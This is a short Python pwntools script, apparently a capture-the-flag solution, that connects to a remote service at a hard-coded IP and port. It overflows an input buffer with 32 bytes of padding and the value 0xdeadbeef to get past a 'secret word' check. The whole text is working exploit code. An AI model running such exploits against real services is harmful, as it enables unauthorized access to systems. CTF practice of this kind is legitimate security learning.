from pwn import *
exe = context.binary = ELF('beef')
io = remote('139.144.184.150', 31337)

io.recvuntil(b'secret word: ')

payload = fit({
    32: 0xdeadbeef
})
io.sendline(payload)
resp = io.recv()
print(resp)